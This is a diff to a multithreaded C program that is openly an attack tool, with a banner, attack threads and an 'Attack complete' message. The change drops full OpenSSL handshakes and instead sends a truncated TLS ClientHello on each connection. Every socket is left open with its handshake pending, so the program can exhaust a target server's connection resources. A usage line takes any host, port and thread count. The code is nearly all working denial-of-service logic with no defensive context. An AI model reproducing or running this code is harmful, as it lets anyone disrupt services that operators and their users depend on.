@@ -8,9 +8,8 @@
 #include <sys/socket.h>
 #include <netdb.h>
 #include <arpa/inet.h>
-#include <openssl/ssl.h>
-#include <openssl/err.h>
 #include <stdatomic.h>
+#include <stddef.h>  // For size_t
 
 #define BANNER "\n\033[1;31m" \
 "                            ,-.\n" \
@@ -29,7 +28,6 @@
 atomic_long total_connections = ATOMIC_VAR_INIT(0);
 atomic_long successful_handshakes = ATOMIC_VAR_INIT(0);
 struct sockaddr_in target_addr;
-
 const char *g_target_host;
 int g_thread_count;
 
@@ -37,27 +35,6 @@ typedef struct {
     int thread_id;
     int max_attempts;
 } ThreadConfig;
-
-void init_openssl() {
-    SSL_load_error_strings();
-    OpenSSL_add_ssl_algorithms();
-}
-
-SSL_CTX* create_ssl_ctx() {
-    SSL_CTX *ctx = SSL_CTX_new(TLSv1_2_client_method());
-    if (ctx == NULL) {
-        fprintf(stderr, "Error creating SSL context\n");
-        ERR_print_errors_fp(stderr);
-        exit(EXIT_FAILURE);
-    }
-    if (!SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET)) {
-        fprintf(stderr, "Error setting SSL context options\n");
-    }
-    if (!SSL_CTX_set_cipher_list(ctx, "RSA")) {
-        fprintf(stderr, "Error setting cipher list\n");
-    }
-    return ctx;
-}
 
 void resolve_target(const char *host, int port) {
     struct hostent *he = gethostbyname(host);
@@ -72,36 +49,32 @@ void resolve_target(const char *host, int port) {
 }
 
 void print_stats() {
-    printf("\r\033[34m[+] Connections: %ld | Handshakes: %ld | Threads: %d\033[0m",
+    printf("\r\033[34m[+] Connections: %ld | Pending Handshakes: %ld | Threads: %d\033[0m",
            atomic_load(&total_connections), atomic_load(&successful_handshakes), g_thread_count);
     fflush(stdout);
 }
 
 void* attack_thread(void* arg) {
     ThreadConfig *config = (ThreadConfig*)arg;
-    SSL_CTX *ctx = create_ssl_ctx();
+    // Define a partial TLS ClientHello message.
+    // This is a truncated ClientHello; it does not complete the handshake.
+    unsigned char partialClientHello[] = {
+        0x16, 0x03, 0x01, 0x00, 0xdc,  // TLS record header: Handshake, TLS 1.0, length 0xdc
+        0x01,                         // Handshake type: ClientHello
+        0x00, 0x00, 0xd8              // Incomplete handshake length field
+    };
 
     for (int i = 0; i < config->max_attempts; i++) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0)
             continue;
-
+        
         if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
-            SSL *ssl = SSL_new(ctx);
-            if (ssl == NULL) {
-                close(sock);
-                continue;
-            }
-            SSL_set_fd(ssl, sock);
-            if (!SSL_set_tlsext_host_name(ssl, g_target_host)) {
-                /* Optional error handling */
-            }
-            if (SSL_connect(ssl) == 1) {
+            ssize_t sent = send(sock, partialClientHello, sizeof(partialClientHello), 0);
+            if (sent == sizeof(partialClientHello)) {
                 atomic_fetch_add(&successful_handshakes, 1);
-                /* Connection remains open.
-                   Do not call SSL_shutdown, SSL_free, or close(sock). */
+                // Connection remains open with the handshake left pending.
             } else {
-                SSL_free(ssl);
                 close(sock);
             }
             atomic_fetch_add(&total_connections, 1);
@@ -114,31 +87,29 @@ void* attack_thread(void* arg) {
     }
     
     free(config);
-    SSL_CTX_free(ctx);
     return NULL;
 }
 
 int main(int argc, char *argv[]) {
     printf(BANNER);
-
+    
     if (argc != 4) {
         printf("Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
         return EXIT_FAILURE;
     }
-
+    
     g_target_host = argv[1];
     int target_port = atoi(argv[2]);
     g_thread_count = atoi(argv[3]);
-
+    
     resolve_target(g_target_host, target_port);
-    init_openssl();
-
+    
     pthread_t *threads = malloc(g_thread_count * sizeof(pthread_t));
     if (threads == NULL) {
         perror("Failed to allocate memory for threads");
         return EXIT_FAILURE;
     }
-
+    
     for (int i = 0; i < g_thread_count; i++) {
         ThreadConfig *config = malloc(sizeof(ThreadConfig));
         if (config == NULL) {
@@ -153,19 +124,17 @@ int main(int argc, char *argv[]) {
             free(config);
         }
     }
-
+    
     while (atomic_load(&total_connections) < (g_thread_count * 1000)) {
         print_stats();
         sleep(1);
     }
-
+    
     for (int i = 0; i < g_thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
-
-    printf("\n\033[32m[+] All connections established and kept open!\033[0m\n");
-
+    
+    printf("\n\033[32m[+] Attack complete: all connections are pending!\033[0m\n");
     free(threads);
-    /* Do not call EVP_cleanup if further SSL operations are expected */
     return EXIT_SUCCESS;
 }
